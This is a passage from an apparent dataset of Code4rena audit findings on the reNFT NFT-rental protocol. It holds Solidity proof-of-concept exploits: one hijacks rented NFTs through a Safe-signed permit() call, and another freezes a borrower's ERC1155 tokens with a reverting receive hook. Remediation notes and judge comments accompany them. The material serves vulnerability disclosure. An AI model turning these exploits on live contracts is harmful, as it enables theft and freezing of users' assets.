rentalOrders[i].hooks,\n                        rentalOrders[i].orderType,\n                        rentalOrders[i].lender,\n                        rentalOrders[i].renter,\n                        rentalOrders[i].rentalWallet,\n                        rentalOrders[i].startTimestamp,\n                        rentalOrders[i].endTimestamp\n                    );\n                }\n            }\n\n            // the offerer of the PAYEE order fulfills the orders. For this order, it shouldn't matter\n            // what the recipient address is\n            vm.prank(fulfiller.addr);\n            seaport.matchAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportMatchOrderFulfillments,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function _deconstructOrdersToFulfill()\n            private\n            view\n            returns (AdvancedOrder[] memory advancedOrders)\n        {\n            // get the length of the orders to fulfill\n            advancedOrders = new AdvancedOrder[](ordersToFulfill.length);\n\n            // build up the advanced orders\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                advancedOrders[i] = ordersToFulfill[i].advancedOrder;\n            }\n        }\n    }\n\n    contract SetupReNFT is OrderFulfiller {}\n\n</details>\n\n<details>\n<summary><b>Exploit.sol</b></summary>\n<br>\n\n    // SPDX-License-Identifier: BUSL-1.1\n    pragma solidity ^0.8.20;\n\n    import {\n        Order,\n        FulfillmentComponent,\n        Fulfillment,\n        ItemType as SeaportItemType,\n        OfferItem,\n        ItemType\n    } from \"@seaport-types/lib/ConsiderationStructs.sol\";\n\n    import {OfferItemLib} from \"@seaport-sol/SeaportSol.sol\";\n\n    import {OrderType, OrderMetadata, RentalOrder} from \"@src/libraries/RentalStructs.sol\";\n\n    import {ERC721} from '@openzeppelin-contracts/token/ERC721/ERC721.sol';\n    import {IERC721} from '@openzeppelin-contracts/token/ERC721/IERC721.sol';\n    import {Ownable} from \"@openzeppelin-contracts/access/Ownable.sol\";\n\n    import {SetupReNFT} from \"./SetupExploit.sol\";\n    import {Assertions} from \"@test/utils/Assertions.sol\";\n    import {Constants} from \"@test/utils/Constants.sol\";\n    import {SafeUtils} from \"@test/utils/GnosisSafeUtils.sol\";\n    import {Enum} from \"@safe-contracts/common/Enum.sol\";\n\n    import \"forge-std/console.sol\";\n\n\n\n    contract Exploit is SetupReNFT, Assertions, Constants {\n\n        using OfferItemLib for OfferItem;\n\n        function test_NFT_Permit_Exploit() public {\n\n            NFTWithPermit permitNFT = new NFTWithPermit();\n\n            // The NFT token which Alice, the lender, will offer.\n            permitNFT.safeMint(alice.addr, 1);\n\n            // Approve seaport conduit to spend the token.\n            vm.prank(alice.addr);\n            permitNFT.approve(address(conduit), 1);\n\n            /////////////////////////////////////////////\n            // Order Creation & Fulfillment simulation //\n            /////////////////////////////////////////////\n\n            // Alice creates a BASE order\n            createOrder({\n                offerer: alice,\n                orderType: OrderType.BASE,\n                erc721Offers: 1,\n                erc1155Offers: 0,\n                erc20Offers: 0,\n                erc721Considerations: 0,\n                erc1155Considerations: 0,\n                erc20Considerations: 1\n            });\n\n            // Remove the pre-inserted offer item (which is inserted by the tests)\n            popOfferItem();\n\n            // Set the NFT which we created as the offer item\n            withOfferItem(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC721)\n                        .withToken(address(permitNFT))\n                        .withIdentifierOrCriteria(1)\n                        .withStartAmount(1)\n                        .withEndAmount(1)\n            );\n\n            // Finalize the order creation\n            (\n                Order memory order,\n                bytes32 orderHash,\n                OrderMetadata memory metadata\n            ) = finalizeOrder();\n            \n\n            // Create an order fulfillment\n            createOrderFulfillment({\n                _fulfiller: attacker,\n                order: order,\n                orderHash: orderHash,\n                metadata: metadata\n            });\n\n            // Finalize the base order fulfillment\n            RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();\n\n            // get the rental order hash\n            bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);\n\n            // assert that the rental order was stored\n            assertEq(STORE.orders(rentalOrderHash), true);\n\n            // assert that the token is in storage\n            assertEq(STORE.isRentedOut(address(attacker.safe), address(permitNFT), 1), true);\n\n            // assert that the ERC1155 is in the rental wallet of the fulfiller\n            assertEq(permitNFT.balanceOf(address(attacker.safe)), 1);\n\n\n            /** ------------------- Exploitation ------------------- */\n\n            // Impersonate the attacker\n            vm.startPrank(attacker.addr);\n\n            // The digest which will be hashed by gnosis then signed by the attacker (owner of the safe).\n            // The format of this digest is taken from the `permit()` function.\n            bytes memory digest = bytes.concat(\n                keccak256(\n                    abi.encodePacked(\n                        '\\x19\\x01',\n                        permitNFT.DOMAIN_SEPARATOR(),\n                        keccak256(\n                            abi.encode(\n                                permitNFT.PERMIT_TYPEHASH(), \n                                attacker.addr, // spender\n                                1, // the token Id\n                                permitNFT.tokenIdNonces(1), // get the nonce for the token ID \"1\"\n                                block.timestamp + 10000000 // deadline until which, the call to `permit()` with this signature will be allowed.\n                            )\n                        )\n                    )\n                )\n            );        \n            \n            // Get the message hash for the digest.\n            bytes32 msgHash = fallbackHandler.getMessageHashForSafe(attacker.safe, digest);\n\n            // Sign the hashed message and get the signature (r, s, v).\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(attacker.privateKey, msgHash);\n\n\n            // The call to `permit()` -> (address spender, uint256 tokenId, uint256 deadline, v, r, s)\n            bytes memory transaction = abi.encodeWithSelector(\n                ERC721Permit.permit.selector,\n                attacker.addr, // The address of the attacker\n                1, // The token ID to hijack\n                block.timestamp + 10000000, // the deadline\n                v,\n                r,\n                s\n            );\n\n            // Sign the transaction to be sent to gnosis\n            bytes memory transactionSignature = SafeUtils.signTransaction(\n                address(attacker.safe),\n                attacker.privateKey,\n                address(permitNFT),\n                transaction\n            );\n\n\n            // Execute the transaction\n            SafeUtils.executeTransaction(\n                address(attacker.safe),\n                address(permitNFT),\n                transaction,\n                transactionSignature\n            );\n\n            // Transfer the NFT from the attacker's safe to the attacker's address. This is the final stage of the exploit\n            permitNFT.transferFrom(address(attacker.safe), address(attacker.addr), 1);\n\n            vm.stopPrank();\n\n            /** -------------- Final checks -------------- */\n\n            uint256 attackersBalance = permitNFT.balanceOf(address(attacker.addr));\n            uint256 attackersSafeBalance = permitNFT.balanceOf(address(attacker.safe));\n\n            if (attackersSafeBalance == 0 && attackersBalance == 1) {\n                console.log(\"Tokens successfully hijacked from the attacker's (borrower) safe!\");\n            }\n\n        }\n\n    }\n\n\n\n\n\n    // Serves as a replacement for openzeppelin's `isContract` function which `ERC721Permit` relies on, simply because the currently installed openzeppelin version (5.0) for this PoC setup no longer includes the function `isContract` in the `Address` library.\n    library Address {\n        function isContract(address account) internal view returns (bool) {\n            // This method relies on extcodesize, which returns 0 for contracts in\n            // construction, since the code is only stored at the end of the\n            // constructor execution.\n\n            uint256 size;\n            assembly {\n                size := extcodesize(account)\n            }\n            return size > 0;\n        }\n    }\n\n    // Source: https://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/ChainId.sol\n    /// @title Function for getting the current chain ID\n    library ChainId {\n        /// @dev Gets the current chain ID\n        /// @return chainId The current chain ID\n        function get() internal view returns (uint256 chainId) {\n            assembly {\n                chainId := chainid()\n            }\n        }\n    }\n\n    // Source: https://github.com/Uniswap/v3-periphery/blob/main/contracts/interfaces/external/IERC1271.sol\n    /// @title Interface for verifying contract-based account signatures\n    /// @notice Interface that verifies provided signature for the data\n    /// @dev Interface defined by EIP-1271\n    interface IERC1271 {\n        /// @notice Returns whether the provided signature is valid for the provided data\n        /// @dev MUST return the bytes4 magic value 0x1626ba7e when function passes.\n        /// MUST NOT modify state (using STATICCALL for solc < 0.5, view modifier for solc > 0.5).\n        /// MUST allow external calls.\n        /// @param hash Hash of the data to be signed\n        /// @param signature Signature byte array associated with _data\n        /// @return magicValue The bytes4 magic value 0x1626ba7e\n        function isValidSignature(bytes32 hash, bytes memory signature) external view returns (bytes4 magicValue);\n    }\n\n    /// @title ERC721 with permit\n    /// @notice Extension to ERC721 that includes a permit function for signature based approvals\n    interface IERC721Permit is IERC721 {\n        /// @notice The permit typehash used in the permit signature\n        /// @return The typehash for the permit\n        function PERMIT_TYPEHASH() external pure returns (bytes32);\n\n        /// @notice The domain separator used in the permit signature\n        /// @return The domain seperator used in encoding of permit signature\n        function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n        /// @notice Approve of a specific token ID for spending by spender via signature\n        /// @param spender The account that is being approved\n        /// @param tokenId The ID of the token that is being approved for spending\n        /// @param deadline The deadline timestamp by which the call must be mined for the approve to work\n        /// @param v Must produce valid secp256k1 signature from the holder along with `r` and `s`\n        /// @param r Must produce valid secp256k1 signature from the holder along with `v` and `s`\n        /// @param s Must produce valid secp256k1 signature from the holder along with `r` and `v`\n        function permit(\n            address spender,\n            uint256 tokenId,\n            uint256 deadline,\n            uint8 v,\n            bytes32 r,\n            bytes32 s\n        ) external payable;\n    }\n\n    // Source: https://github.com/Uniswap/v3-periphery/blob/main/contracts/base/ERC721Permit.sol\n    /// @title ERC721 with permit\n    /// @notice Nonfungible tokens that support an approve via signature, i.e. permit\n    abstract contract ERC721Permit is ERC721, IERC721Permit {\n        /// @dev Gets the current nonce for a token ID and then increments it, returning the original value\n        function _getAndIncrementNonce(uint256 tokenId) internal virtual returns (uint256);\n\n        /// @dev The hash of the name used in the permit signature verification\n        bytes32 private immutable nameHash;\n\n        /// @dev The hash of the version string used in the permit signature verification\n        bytes32 private immutable versionHash;\n\n        /// @notice Computes the nameHash and versionHash\n        constructor(\n            string memory name_,\n            string memory symbol_,\n            string memory version_\n        ) ERC721(name_, symbol_) {\n            nameHash = keccak256(bytes(name_));\n            versionHash = keccak256(bytes(version_));\n        }\n\n        /// @inheritdoc IERC721Permit\n        function DOMAIN_SEPARATOR() public view override returns (bytes32) {\n            return\n                keccak256(\n                    abi.encode(\n                        // keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)')\n                        0x8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f,\n                        nameHash,\n                        versionHash,\n                        ChainId.get(),\n                        address(this)\n                    )\n                );\n        }\n\n        /// @inheritdoc IERC721Permit\n        /// @dev Value is equal to keccak256(\"Permit(address spender,uint256 tokenId,uint256 nonce,uint256 deadline)\");\n        bytes32 public constant override PERMIT_TYPEHASH =\n            0x49ecf333e5b8c95c40fdafc95c1ad136e8914a8fb55e9dc8bb01eaa83a2df9ad;\n\n        /// @inheritdoc IERC721Permit\n        function permit(\n            address spender,\n            uint256 tokenId,\n            uint256 deadline,\n            uint8 v,\n            bytes32 r,\n            bytes32 s\n        ) external payable override {\n            require(block.timestamp <= deadline, 'Permit expired');\n\n            bytes32 digest =\n                keccak256(\n                    abi.encodePacked(\n                        '\\x19\\x01',\n                        DOMAIN_SEPARATOR(),\n                        keccak256(abi.encode(PERMIT_TYPEHASH, spender, tokenId, _getAndIncrementNonce(tokenId), deadline))\n                    )\n                );\n            address owner = ownerOf(tokenId);\n            require(spender != owner, 'ERC721Permit: approval to current owner');\n\n            if (Address.isContract(owner)) {\n                require(IERC1271(owner).isValidSignature(digest, abi.encodePacked(r, s, v)) == 0x1626ba7e, 'Unauthorized');\n            } else {\n                address recoveredAddress = ecrecover(digest, v, r, s);\n                require(recoveredAddress != address(0), 'Invalid signature');\n                require(recoveredAddress == owner, 'Unauthorized');\n            }\n\n            _approve(spender, tokenId);\n        }\n    }\n\n\n    contract NFTWithPermit is ERC721, ERC721Permit, Ownable {\n        \n        mapping(uint256 tokenId => uint256 nonce) public tokenIdNonces;\n\n        constructor() ERC721Permit(\"MyNFT\", \"MNFT\", \"1.1\") Ownable(msg.sender) {}\n\n        function _getAndIncrementNonce(uint256 tokenId) internal override returns (uint256) {\n\n            uint256 tokenIdNonce = tokenIdNonces[tokenId];\n\n            tokenIdNonces[tokenId] += 1;\n\n            return tokenIdNonce;\n        }\n\n        function safeMint(address to, uint256 tokenId) public onlyOwner {\n            _safeMint(to, tokenId);\n        }\n\n    }\n\n</details>\n\n***\n\n### Impact\n\n***\n\nThis allows an attacker to hijack any NFT implementing the `permit()` function.\n\n***\n\n### Remediation\n\n***\n\nOne way to remediate this is to add a check in the [`FallbackManager.sol`](https://github.com/safe-global/safe-contracts/blob/main/contracts/base/FallbackManager.sol) contract in the gnosis safe contracts. This check should check if the function selector is equivalent to `isValidSignature(bytes32,bytes)` and the `msg.sender` is an address of a NFT token that is rented in the reNFT protocol.\n\n**[Alec1017 (reNFT) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/587#issuecomment-1910740999):**\n > Non-standard ERC implementations were considered out of scope, but regardless we do plan on adding a whitelist for tokens interacting with the protocol.\n\n**[0xean (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/587#issuecomment-1912630065):**\n > While the permit functionality is not part of the specification for ERC 721 (nor ERC20) I don't think it would be reasonable to call this out of scope.  I do think that its a pre-condition for this attack and therefore might be better classified as M severity. Would welcome more conversation if the sponsor disagrees strongly, but think this is a valid issue that isn't a \"gotcha\" like some of the other odd ERC20 token exploits. \n\n**[Alec1017 (reNFT) acknowledged](https://github.com/code-423n4/2024-01-renft-findings/issues/587#issuecomment-1910740837)**\n\n_Note: To see full discussion, see [here](https://github.com/code-423n4/2024-01-renft-findings/issues/587)._\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/11) - Introduces support for rented tokens that use Permit() for gasless approvals. The rental safe should now be able to prevent gasless signatures from approving rented assets.\n\n**Status:** Mitigation error. Full details in reports from [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/26) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/10), and also included in the [Mitigation Review](#mitigation-review) section below.\n\n***\n\n",
      "summary": "\nThis report describes a bug in the ERC721-Permit feature, which is used to add a new `permit()` function to the ERC721 standard. This function allows users to sign an ERC721 approve transaction off-chain and then submit it to the permit function, which will execute the approve function. This feature is meant to enable meta-transaction support for ERC721 transfers and prevent misuse and replay attacks.\n\nThe bug allows a malicious borrower to hijack an NFT token by producing a signature and feeding it to the `permit()` function, requesting it to approve their address to transfer the token. The steps to exploit this bug are outlined in the report, and a proof of concept is provided in the form of two files that need to be added to the test folder and a command that needs to be run.\n\nTo fix this bug, the report suggests adding checks for the `permit()` function in the ReNFT code. It also provides information on the contracts and policies that need to be deployed for the exploit to work.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/587",
      "tags": [
        "ERC721",
        "NFT"
      ],
      "finders": [
        "sin1st3r\\_\\_"
      ]
    },
    {
      "id": "30528",
      "title": "[M-01] A malicious lender can freeze borrower's ERC1155 tokens indefinitely because the guard can't differentiate between rented and non-rented ERC1155 tokens in the borrower's safe.",
      "impact": "MEDIUM",
      "content": "\n### Pre-requisite knowledge & an overview of the features in question\n\n***\n\n1.  **Gnosis safe guards**: A gnosis guard is a contract that acts as a transaction guard which allows the owner of the safe to limit the contracts and functions that may be called by the multisig owners of the safe. ReNFT has created it's own gnosis guard contract, which is [Guard.sol](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Guard.sol).\n\n    **Example utility**: When you ask reNFT to create a rental safe for you by calling [deployRentalSafe()](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Factory.sol#L138) in [Factory.sol](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Factory.sol), reNFT creates a rental safe for you and automatically installs it's own guard contract on it. Everytime you send a call from your gnosis safe, this call has to first pass through that guard. If you're for example, trying to move a NFT token you rented using `transferFrom()`, it'll prevent you from doing so. When it intercepts the transaction you're trying to send, it checks for a [list of function signatures](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L195) that can be malicious, for example it checks if you're trying to enable/disable a module it has not authorized. It checks if you're trying to change the guard contract address itself, It also checks if you're trying to transfer or approve a rented NFT or ERC1155 token using the most common functions like `approve()`, `safeTransferFrom()`, `transferFrom()`, `setApprovalForAll()`. This guard acts as the single and most important defense line against rented ERC721/1155 token theft.\n\n***\n\n### The Vulnerability & Exploitation Steps\n\n***\n\nThe vulnerability exists in the [Guard.sol](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol) contract, [L-242](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L242)\n\n        } else if (selector == e1155_safe_transfer_from_selector) {\n            // Load the token ID from calldata.\n            uint256 tokenId = uint256(\n                _loadValueFromCalldata(data, e1155_safe_transfer_from_token_id_offset)\n            );\n\n            // Check if the selector is allowed.\n            _revertSelectorOnActiveRental(selector, from, to, tokenId);\n\nThe guard does not differentiate between ERC1155 tokens of address of same ID that are actively being rented and those that aren't rented. So for example, you had 2,000 \"GameToken\" ERC1155 tokens with an id of 5, that are not rented. And you rented 10 \"GameToken\" ERC1155 tokens of the same id \"5\", you will not be able to move or transfer the non-rented 2,000 \"GameToken\" ERC1155 tokens which you had prior to rented the other 10 tokens, until the 10 \"GameToken\" rental expires and gets stopped/finalized.\n\nThe problem is that a malicious lender can exploit this to freeze the borrower's pre-existing funds of the same kind indefinitely by preventing his rental (the rental in which the lender lended ERC1155 tokens to the borrower), from being stopped even if the expiry date of the rental has passed. He can do so by utilizing the fact that the `Reclaimer` contract utilizes `safeTransferFrom` to give the lender his tokens back after the rental gets stopped. The lender can then set up a `onERC1155Receive()` hook that reverts until he decides otherwise. This will prevent the rental from being stopped and therefore, it'll prevent the borrower from transferring his pre-rental tokens, making them indefinitely stuck.\n\n**Proof of concept**\n\n1.  The borrower, Jack, has 1,000 ERC1155 tokens of id 5 that are not rented.\n2.  Jack decides to lend 10 ERC1155 tokens of same id, 5, from Alice (malicious lender). Rental period will last 10 days.\n3.  Alice (malicious smart contract lender) sets a `onERC1155Receive()` hook which reverts if certain time has not passed\n4.  Whenever Jack tries to stop the rental after 10 days have passed by calling `stopRent()`, it will revert.\n5.  Jack will not be able to transfer his non-rented 1,000 ERC1155 tokens out of his rental safe until the malicious lender decides otherwise.\n\n***\n\n### Proof of concept code\n\n***\n\nTo run the PoC, you'll need to do the following:\n\n1.  You'll need to add the following two files to the test/ folder:\n    1.  `SetupExploit.sol` -> Sets up everything from seaport, gnosis, reNFT contracts\n    2.  `Exploit.sol` -> The actual exploit PoC which relies on `SetupExploit.sol` as a base.\n2.  You'll need to run this command\n    `forge test --match-contract Exploit --match-test test_ERC1155_Freeze_Exploit -vv`\n\n*Note: All of my 7 PoCs throughout my reports include the `SetupExploit.sol`. Please do not rely on the previous `SetupExploit.sol` file if you already had one from another PoC run in the tests/ folder. In some PoCs, there are slight modifications done in that file to properly set up the test infrastructure needed for the exploit*\n\n**The files:**\n\n<details>\n<summary><b>SetupExploit.sol</b></summary>\n<br>\n\n    // SPDX-License-Identifier: BUSL-1.1\n    pragma solidity ^0.8.20;\n\n    import {\n        ConsiderationItem,\n        OfferItem,\n        OrderParameters,\n        OrderComponents,\n        Order,\n        AdvancedOrder,\n        ItemType,\n        ItemType as SeaportItemType,\n        CriteriaResolver,\n        OrderType as SeaportOrderType,\n        Fulfillment,\n        FulfillmentComponent\n    } from \"@seaport-types/lib/ConsiderationStructs.sol\";\n    import {\n        AdvancedOrderLib,\n        ConsiderationItemLib,\n        FulfillmentComponentLib,\n        FulfillmentLib,\n        OfferItemLib,\n        OrderComponentsLib,\n        OrderLib,\n        OrderParametersLib,\n        SeaportArrays,\n        ZoneParametersLib\n    } from \"@seaport-sol/SeaportSol.sol\";\n\n    import {\n        OrderMetadata,\n        OrderType,\n        OrderFulfillment,\n        RentPayload,\n        RentalOrder,\n        Item,\n        SettleTo,\n        ItemType as RentalItemType\n    } from \"@src/libraries/RentalStructs.sol\";\n\n    import {ECDSA} from \"@openzeppelin-contracts/utils/cryptography/ECDSA.sol\";\n    import {OrderMetadata, OrderType, Hook} from \"@src/libraries/RentalStructs.sol\";\n    import {Vm} from \"@forge-std/Vm.sol\";\n    import {Test} from \"@forge-std/Test.sol\";\n    import {Assertions} from \"@test/utils/Assertions.sol\";\n    import {Constants} from \"@test/utils/Constants.sol\";\n    import {LibString} from \"@solady/utils/LibString.sol\";\n    import {SafeL2} from \"@safe-contracts/SafeL2.sol\";\n    import {Safe} from \"@safe-contracts/Safe.sol\";\n    // import {BaseExternal} from \"@test/fixtures/external/BaseExternal.sol\";\n    import {SafeProxyFactory} from \"@safe-contracts/proxies/SafeProxyFactory.sol\";\n    import {Create2Deployer} from \"@src/Create2Deployer.sol\";\n    import {Kernel, Actions} from \"@src/Kernel.sol\";\n    import {Storage} from \"@src/modules/Storage.sol\";\n    import {PaymentEscrow} from \"@src/modules/PaymentEscrow.sol\";\n    import {Create} from \"@src/policies/Create.sol\";\n    import {Stop} from \"@src/policies/Stop.sol\";\n    import {Factory} from \"@src/policies/Factory.sol\";\n    import {Admin} from \"@src/policies/Admin.sol\";\n    import {Guard} from \"@src/policies/Guard.sol\";\n    import {toRole} from \"@src/libraries/KernelUtils.sol\";\n    import {Proxy} from \"@src/proxy/Proxy.sol\";\n    import {Events} from \"@src/libraries/Events.sol\";\n    import {HandlerContext} from \"@safe-contracts/handler/HandlerContext.sol\";\n    import {CompatibilityFallbackHandler} from \"@safe-contracts/handler/CompatibilityFallbackHandler.sol\";\n    import {Ownable} from \"@openzeppelin-contracts/access/Ownable.sol\";\n    import {ERC1155} from '@openzeppelin-contracts/token/ERC1155/ERC1155.sol';\n    import {ISignatureValidator} from \"@safe-contracts/interfaces/ISignatureValidator.sol\";\n\n    import {ProtocolAccount} from \"@test/utils/Types.sol\";\n    import {MockERC20} from \"@test/mocks/tokens/standard/MockERC20.sol\";\n    import {MockERC721} from \"@test/mocks/tokens/standard/MockERC721.sol\";\n    import {MockERC1155} from \"@test/mocks/tokens/standard/MockERC1155.sol\";\n    import {SafeUtils} from \"@test/utils/GnosisSafeUtils.sol\";\n    import {Enum} from \"@safe-contracts/common/Enum.sol\";\n    import {ISafe} from \"@src/interfaces/ISafe.sol\";\n\n    import {Seaport} from \"@seaport-core/Seaport.sol\";\n    import {ConduitController} from \"@seaport-core/conduit/ConduitController.sol\";\n    import {ConduitControllerInterface} from \"@seaport-types/interfaces/ConduitControllerInterface.sol\";\n    import {ConduitInterface} from \"@seaport-types/interfaces/ConduitInterface.sol\";\n\n    import \"@forge-std/console.sol\";\n\n\n\n    // Deploys all Seaport protocol contracts\n    contract External_Seaport is Test {\n        // seaport protocol contracts\n        Seaport public seaport;\n        ConduitController public conduitController;\n        ConduitInterface public conduit;\n\n        // conduit owner and key\n        Vm.Wallet public conduitOwner;\n        bytes32 public conduitKey;\n\n        function setUp() public virtual {\n            // generate conduit owner wallet\n            conduitOwner = vm.createWallet(\"conduitOwner\");\n\n            // deploy conduit controller\n            conduitController = new ConduitController();\n\n            // deploy seaport\n            seaport = new Seaport(address(conduitController));\n\n            // create a conduit key (first 20 bytes must be conduit creator)\n            conduitKey = bytes32(uint256(uint160(conduitOwner.addr))) << 96;\n\n            // create a new conduit\n            vm.prank(conduitOwner.addr);\n            address conduitAddress = conduitController.createConduit(\n                conduitKey,\n                conduitOwner.addr\n            );\n\n            // set the conduit address\n            conduit = ConduitInterface(conduitAddress);\n\n            // open a channel for seaport on the conduit\n            vm.prank(conduitOwner.addr);\n            conduitController.updateChannel(address(conduit), address(seaport), true);\n\n            // label the contracts\n            vm.label(address(seaport), \"Seaport\");\n            vm.label(address(conduitController), \"ConduitController\");\n            vm.label(address(conduit), \"Conduit\");\n        }\n    }\n\n    // Deploys the Create2Deployer contract\n    contract External_Create2Deployer is Test {\n        Create2Deployer public create2Deployer;\n\n        function setUp() public virtual {\n            // Deploy the create2 deployer contract\n            create2Deployer = new Create2Deployer();\n\n            // label the contract\n            vm.label(address(create2Deployer), \"Create2Deployer\");\n        }\n    }\n\n    // Deploys all Gnosis Safe protocol contracts\n    contract External_Safe is Test {\n        SafeL2 public safeSingleton;\n        SafeProxyFactory public safeProxyFactory;\n\n        CompatibilityFallbackHandler public fallbackHandler;\n\n        function setUp() public virtual {\n            // Deploy safe singleton contract\n            safeSingleton = new SafeL2();\n\n            // Deploy safe proxy factory\n            safeProxyFactory = new SafeProxyFactory();\n\n            // Deploy the compatibility token handler\n            fallbackHandler = new CompatibilityFallbackHandler();\n\n            // Label the contracts\n            vm.label(address(safeSingleton), \"SafeSingleton\");\n            vm.label(address(safeProxyFactory), \"SafeProxyFactory\");\n            vm.label(address(fallbackHandler), \"TokenCallbackHandler\");\n        }\n    }\n\n    contract BaseExternal is External_Create2Deployer, External_Seaport, External_Safe {\n        // This is an explicit entrypoint for all external contracts that the V3 protocol depends on.\n        //\n        // It contains logic for:\n        // - setup of the Create2Deployer contract\n        // - setup of all Seaport protocol contracts\n        // - setup of all Gnosis Safe protocol contracts\n        //\n        // The inheritance chain is as follows:\n        // External_Create2Deployer + External_Seaport + External_Safe\n        // --> BaseExternal\n\n        function setUp()\n            public\n            virtual\n            override(External_Create2Deployer, External_Seaport, External_Safe)\n        {\n            // set up dependencies\n            External_Create2Deployer.setUp();\n            External_Seaport.setUp();\n            External_Safe.setUp();\n        }\n    }\n\n    // Deploys all V3 protocol contracts\n    contract Protocol is BaseExternal {\n        // Kernel\n        Kernel public kernel;\n\n        // Modules\n        Storage public STORE;\n        PaymentEscrow public ESCRW;\n\n        // Module implementation addresses\n        Storage public storageImplementation;\n        PaymentEscrow public paymentEscrowImplementation;\n\n        // Policies\n        Create public create;\n        Stop public stop;\n        Factory public factory;\n        Admin public admin;\n        Guard public guard;\n\n        // Protocol accounts\n        Vm.Wallet public rentalSigner;\n        Vm.Wallet public deployer;\n\n        // protocol constants\n        bytes12 public protocolVersion;\n        bytes32 public salt;\n\n        function _deployKernel() internal {\n            // abi encode the kernel bytecode and constructor arguments\n            bytes memory kernelInitCode = abi.encodePacked(\n                type(Kernel).creationCode,\n                abi.encode(deployer.addr, deployer.addr)\n            );\n\n            // Deploy kernel contract\n            vm.prank(deployer.addr);\n            kernel = Kernel(create2Deployer.deploy(salt, kernelInitCode));\n\n            // label the contract\n            vm.label(address(kernel), \"kernel\");\n        }\n\n        function _deployStorageModule() internal {\n            // abi encode the storage bytecode and constructor arguments\n            // for the implementation contract\n            bytes memory storageImplementationInitCode = abi.encodePacked(\n                type(Storage).creationCode,\n                abi.encode(address(0))\n            );\n\n            // Deploy storage implementation contract\n            vm.prank(deployer.addr);\n            storageImplementation = Storage(\n                create2Deployer.deploy(salt, storageImplementationInitCode)\n            );\n\n            // abi encode the storage bytecode and initialization arguments\n            // for the proxy contract\n            bytes memory storageProxyInitCode = abi.encodePacked(\n                type(Proxy).creationCode,\n                abi.encode(\n                    address(storageImplementation),\n                    abi.encodeWithSelector(\n                        Storage.MODULE_PROXY_INSTANTIATION.selector,\n                        address(kernel)\n                    )\n                )\n            );\n\n            // Deploy storage proxy contract\n            vm.prank(deployer.addr);\n            STORE = Storage(create2Deployer.deploy(salt, storageProxyInitCode));\n\n            // label the contracts\n            vm.label(address(STORE), \"STORE\");\n            vm.label(address(storageImplementation), \"STORE_IMPLEMENTATION\");\n        }\n\n        function _deployPaymentEscrowModule() internal {\n            // abi encode the payment escrow bytecode and constructor arguments\n            // for the implementation contract\n            bytes memory paymentEscrowImplementationInitCode = abi.encodePacked(\n                type(PaymentEscrow).creationCode,\n                abi.encode(address(0))\n            );\n\n            // Deploy payment escrow implementation contract\n            vm.prank(deployer.addr);\n            paymentEscrowImplementation = PaymentEscrow(\n                create2Deployer.deploy(salt, paymentEscrowImplementationInitCode)\n            );\n\n            // abi encode the payment escrow bytecode and initialization arguments\n            // for the proxy contract\n            bytes memory paymentEscrowProxyInitCode = abi.encodePacked(\n                type(Proxy).creationCode,\n                abi.encode(\n                    address(paymentEscrowImplementation),\n                    abi.encodeWithSelector(\n                        PaymentEscrow.MODULE_PROXY_INSTANTIATION.selector,\n                        address(kernel)\n                    )\n                )\n            );\n\n            // Deploy payment escrow contract\n            vm.prank(deployer.addr);\n            ESCRW = PaymentEscrow(create2Deployer.deploy(salt, paymentEscrowProxyInitCode));\n\n            // label the contracts\n            vm.label(address(ESCRW), \"ESCRW\");\n            vm.label(address(paymentEscrowImplementation), \"ESCRW_IMPLEMENTATION\");\n        }\n\n        function _deployCreatePolicy() internal {\n            // abi encode the create policy bytecode and constructor arguments\n            bytes memory createInitCode = abi.encodePacked(\n                type(Create).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy create rental policy contract\n            vm.prank(deployer.addr);\n            create = Create(create2Deployer.deploy(salt, createInitCode));\n\n            // label the contract\n            vm.label(address(create), \"CreatePolicy\");\n        }\n\n        function _deployStopPolicy() internal {\n            // abi encode the stop policy bytecode and constructor arguments\n            bytes memory stopInitCode = abi.encodePacked(\n                type(Stop).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy stop rental policy contract\n            vm.prank(deployer.addr);\n            stop = Stop(create2Deployer.deploy(salt, stopInitCode));\n\n            // label the contract\n            vm.label(address(stop), \"StopPolicy\");\n        }\n\n        function _deployAdminPolicy() internal {\n            // abi encode the admin policy bytecode and constructor arguments\n            bytes memory adminInitCode = abi.encodePacked(\n                type(Admin).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy admin policy contract\n            vm.prank(deployer.addr);\n            admin = Admin(create2Deployer.deploy(salt, adminInitCode));\n\n            // label the contract\n      